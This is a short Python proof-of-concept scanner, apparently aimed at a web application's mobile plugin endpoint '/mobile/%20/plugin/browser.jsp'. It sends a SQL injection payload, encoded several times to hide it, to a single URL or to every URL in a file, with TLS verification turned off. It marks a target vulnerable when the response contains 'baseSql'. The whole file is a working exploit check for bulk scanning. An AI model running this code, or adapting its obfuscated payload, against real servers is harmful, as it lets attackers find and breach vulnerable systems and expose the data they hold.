import argparse
import requests, warnings
from requests.packages import urllib3

# 处理https报错问题
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# 定义函数ask处理请求
def ask(url):
    if "http" in url:
        url = url + "/mobile/%20/plugin/browser.jsp"
    else:
        url = "http://"+url + "/mobile/%20/plugin/browser.jsp"
    data = {"isDis": "1", "browserTypeId": "269",
            "keyword": "isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%32%25%33%37%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%31%25%32%35%25%33%34%25%36%33%25%32%35%25%33%35%25%36%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%38%25%32%35%25%33%34%25%33%39%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%35%25%33%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37"}
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chro'
                      'me/53.0.2785.104 Safari/537.36 Core/1.53.2372.400 QQBrowser/9.5.10548.400'
    }
    # 发送 POST 请求
    try:
        response = requests.post(url=url, headers=headers, data=data, timeout=2, verify=False)  # 忽略证书
        # 判断返回结果中是否包含字符串 result
        if 'baseSql' in response.text and "baseSql" in response.text:
            print('[+] 存在漏洞：', url)
        else:
            print('[-] 不存在漏洞：', url)
    except requests.exceptions.RequestException as e:
        print("[-] 请求失败")



def main():
    # 创建参数解析器
    parser = argparse.ArgumentParser(description='Scan for vulnerability')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', type=str, help='Specify the target URL')
    group.add_argument('-f', '--file', type=str, help='Specify the file to be scanned')
    # 解析命令行参数
    args = parser.parse_args()
    # 如果指定了 URL 参数，单独调用扫描
    if args.url:
        url = args.url
        ask(url)
    # 如果指定了文件参数，读取文件中的 URL 并添加到列表中
    if args.file:
        with open(args.file, 'r') as f:
            # 遍历 URL 列表，依次进行漏洞扫描
            for urls in f.readlines():
                url = urls.strip('\n')
                ask(url)
        f.close()


if __name__ == "__main__":
    main()
